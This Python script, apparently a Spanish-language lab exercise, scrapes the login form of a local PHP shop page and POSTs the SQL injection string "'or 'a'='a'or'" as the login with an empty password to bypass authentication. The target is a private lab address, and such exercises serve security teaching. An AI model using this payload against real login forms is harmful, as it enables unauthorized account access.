# -*- coding: utf-8 -*-
"""
Created on Sun May  9 23:07:58 2021

@author: dande
"""

import requests
from urllib.request import urlopen
from bs4 import BeautifulSoup

url = "http://192.168.0.20/php_tiendita_login/tiendita_login.htm"
peticion = requests.get(url)
print("\nPetición HTTP")
print("\nSitio: " + str(peticion.url))
print("CÃ³digo de operaciÃ³n: " + str(peticion.status_code))
print("CÃ³digo del sitio:\n" + str(peticion.text))


print("\nExtrae el contenido de un formulario")
print("URL: " + url)
html = urlopen(url)
bs = BeautifulSoup(html.read(), 'html.parser')
print("\nContenido del formulario:\n")
print(bs.form)
print("\nNombre y valor de cada 'input' del formulario:\n")
valores = {e['name']: e.get('value', '') for e in bs.find_all('input', {'name': True})}
print(valores)


login = "'or 'a'='a'or'"
password = ""
url_servidor = "http://192.168.0.20/php_tiendita_login/tiendita_login.htm"

print("\nEnviar los datos de un formulario:")
print("Dirección y página que reciben los datos: "+ url_servidor)
print("Campos y valores que se envian: login = " + login + ", password = "+password)
parametros = {'login':login, 'password':password}
respuesta = requests.post(url_servidor, data = parametros)
print(respuesta)
